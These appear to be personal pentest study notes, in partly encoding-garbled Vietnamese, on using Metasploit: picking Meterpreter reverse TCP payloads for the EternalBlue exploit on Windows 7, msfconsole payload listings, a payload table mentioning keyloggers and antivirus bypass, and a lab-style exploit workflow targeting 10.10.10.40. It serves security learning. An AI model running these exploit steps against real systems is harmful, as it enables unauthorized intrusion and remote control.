  Cung cáº¥p nhiá»u chá»©c nÄƒng máº¡nh máº½ sáºµn cÃ³.
  CÃ³ thá»ƒ tá»± Ä‘á»™ng hÃ³a vÃ  káº¿t há»£p vá»›i plugin (vÃ­ dá»¥ plugin Mimikatz cá»§a GentilKiwi) Ä‘á»ƒ:
    TrÃ­ch xuáº¥t máº­t kháº©u
    Thá»±c hiá»‡n post-exploitation nhanh chÃ³ng
  GiÃºp pentest cÃ³ tá»• chá»©c, tiáº¿t kiá»‡m thá»i gian.
ğŸ“Œ CÃ¡ch xem payloads
  Trong msfconsole, dÃ¹ng lá»‡nh: show payloads
    â†’ sáº½ liá»‡t kÃª toÃ n bá»™ payload cÃ³ sáºµn (bao gá»“m shell payloads vÃ  Meterpreter payloads).

TÃ³m láº¡i: Payload chá»n tuá»³ theo má»¥c tiÃªu, nhÆ°ng náº¿u cáº§n kháº£ nÄƒng má»Ÿ rá»™ng, linh hoáº¡t, post-exploitation chuyÃªn sÃ¢u â†’ chá»n Meterpreter.

Chá»n Payload trong Metasploit
  Metasploit cÃ³ ráº¥t nhiá»u payload Ä‘á»ƒ chá»n.
  NgoÃ i payload cÃ³ sáºµn, ta cÃ²n cÃ³ thá»ƒ tá»± táº¡o payload báº±ng msfvenom (sáº½ há»c sau).
ğŸ”¹ Thá»­ nghiá»‡m vá»›i target Windows 7 (x64)
  Máº·c Ä‘á»‹nh exploit sáº½ dÃ¹ng payload Ä‘Æ¡n giáº£n: reverse_tcp_shell.
  NhÆ°ng á»Ÿ Ä‘Ã¢y ta thay tháº¿ báº±ng má»™t Meterpreter payload dÃ nh cho Windows 7 (x64).
ğŸ”¹ CÃ¡ch chá»n
  Trong danh sÃ¡ch payloads (show payloads), cuá»™n xuá»‘ng sáº½ tháº¥y pháº§n Meterpreter Payloads cho Windows (x64).
  Tá»« Ä‘Ã³ ta chá»n Ä‘Ãºng payload phÃ¹ há»£p Ä‘á»ƒ dÃ¹ng.
ğŸ‘‰ Ã chÃ­nh: Thay vÃ¬ dÃ¹ng payload máº·c Ä‘á»‹nh (reverse shell Ä‘Æ¡n giáº£n), ta chá»n Meterpreter x64 payload cho Windows 7 Ä‘á»ƒ cÃ³ nhiá»u tÃ­nh nÄƒng hÆ¡n.

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

MSF - Searching for Specific Payload

  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
     6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
     7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
     8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
     9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
     10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
     11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
     12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
     13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
     14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
     16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
     17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
     18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
     19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads
  [*] 14

  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
    => chá»‰ cÃ²n show ra 3 káº¿t quáº£ 

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Selecting Payloads

  msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
  Module options (exploit/windows/smb/ms17_010_eternalblue):
     Name           Current Setting  Required  Description
     ----           ---------------  --------  -----------
     RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
     RPORT          445              yes       The target port (TCP)
     SMBDomain      .                no        (Optional) The Windows domain to use for authentication
     SMBPass                         no        (Optional) The password for the specified username
     SMBUser                         no        (Optional) The username to authenticate as
     VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
     VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
  Exploit target:
     Id  Name
     --  ----
     0   Windows 7 and Server 2008 R2 (x64) All Service Packs
  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
     16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
     17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
  payload => windows/x64/meterpreter/reverse_tcp

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

MSF - Meterpreter Commands

  meterpreter > help

Khi báº¡n exploit thÃ nh cÃ´ng báº±ng má»™t payload kiá»ƒu Meterpreter reverse TCP, thÃ¬ quy trÃ¬nh nhÆ° sau:
1. Stager trÃªn mÃ¡y náº¡n nhÃ¢n cháº¡y â†’ nÃ³ táº¡o káº¿t ná»‘i ngÆ°á»£c (reverse connection) vá» mÃ¡y attacker.
2. Ngay khi káº¿t ná»‘i thÃ nh cÃ´ng, framework (Metasploit) sáº½ tá»± Ä‘á»™ng má»Ÿ má»™t Channel Ä‘á»ƒ quáº£n lÃ½ luá»“ng dá»¯ liá»‡u qua láº¡i.
  Channel 1 thÆ°á»ng lÃ  káº¿t ná»‘i chÃ­nh (reverse TCP session).
  Náº¿u sau nÃ y báº¡n má»Ÿ thÃªm shell, webcam, hay file transfer thÃ¬ nÃ³ cÃ³ thá»ƒ táº¡o ra Channel 2, 3,â€¦ Ä‘á»ƒ phá»¥c vá»¥ cÃ¡c chá»©c nÄƒng riÃªng.
LÃºc nÃ y Metasploit bÃ¡o "Meterpreter session x opened" â†’ nghÄ©a lÃ  channel chÃ­nh Ä‘Ã£ Ä‘Æ°á»£c táº¡o vÃ  báº¡n Ä‘Æ°á»£c Ä‘Æ°a vÃ o CLI cá»§a Meterpreter.
ğŸ‘‰ Váº­y nÃªn: khÃ´ng cáº§n báº¡n tá»± táº¡o channel báº±ng tay, mÃ  nÃ³ sáº½ tá»± Ä‘á»™ng sinh ra ngay khi payload káº¿t ná»‘i vá» thÃ nh cÃ´ng.

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Payload Types

| **Payload**                           | **MÃ´ táº£**                                          | **Äáº·c Ä‘iá»ƒm chÃ­nh**                                                       |
| ------------------------------------- | -------------------------------------------------- | ------------------------------------------------------------------------ |
| **generic/custom**                    | Payload chung, do ngÆ°á»i dÃ¹ng tá»± Ä‘á»‹nh nghÄ©a         | Linh hoáº¡t, Ä‘a ná»n táº£ng                                                   |
| **generic/shell\_bind\_tcp**          | Bind shell TCP cÆ¡ báº£n                              | Victim láº¯ng nghe, attacker káº¿t ná»‘i vÃ o                                   |
| **generic/shell\_reverse\_tcp**       | Reverse shell TCP cÆ¡ báº£n                           | Victim káº¿t ná»‘i ngÆ°á»£c vá» attacker                                         |
| **windows/x64/exec**                  | Thá»±c thi lá»‡nh báº¥t ká»³ (VD: `calc.exe`)              | Cháº¡y trá»±c tiáº¿p má»™t process                                               |
| **windows/x64/loadlibrary**           | Load má»™t thÆ° viá»‡n DLL x64                          | DÃ¹ng Ä‘á»ƒ náº¡p DLL tÃ¹y Ã½                                                    |
| **windows/x64/messagebox**            | Hiá»‡n há»™p thoáº¡i MessageBox                          | Chá»§ yáº¿u Ä‘á»ƒ test, PoC                                                     |
| **windows/x64/shell\_reverse\_tcp**   | Reverse shell, **single payload**                  | ToÃ n bá»™ shellcode náº±m trong 1 payload                                    |
| **windows/x64/shell/reverse\_tcp**    | Reverse shell, **staged payload** (stager + stage) | Nháº¹ ban Ä‘áº§u, táº£i thÃªm sau                                                |
| **windows/x64/shell/bind\_ipv6\_tcp** | Bind shell trÃªn IPv6                               | DÃ¹ng trong máº¡ng IPv6                                                     |
| **windows/x64/meterpreter/**          | Meterpreter reverse/bind/...                       | Nhiá»u tÃ­nh nÄƒng nÃ¢ng cao (file, webcam, keylogger, pivot, dump hash,...) |
| **windows/x64/powershell/**           | Payload PowerShell                                 | Cho session PowerShell, dá»… bypass AV/EDR                                 |
| **windows/x64/vncinject/**            | VNC server reflective injection                    | Cho attacker truy cáº­p GUI desktop cá»§a victim                             |



















//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
Frist time, you need search keyword 
  searchsploit openssh 7.2

Open metasploit 
  msfconsole

Search modules exploit 
  search exploit CVE-XXXX-XXXX

Use module 
  use 0     // can be use ordinal or module name
  use exploit/windows/smb/ms17_010_psexec

What option we need ? 
  show options

How to setup ? when you know options you need config 
  set RHOSTS 10.10.10.40
  set LHOST tun0

We done ? yes. In the final step, you need to exploit
But you need to check that to ensure sever is vulnerable 
  check

Ok final 
  exploit 




Tip : tÃ¬m kiá»ƒm file trong metasploit dÃ¹ng lá»‡nh nhÆ° vÃ­ dá»¥ dÆ°á»›i . vÃ¬ find k hoáº¡t Ä‘á»™ng Ä‘Ã¢u 
  meterpreter > search -f flag.txt


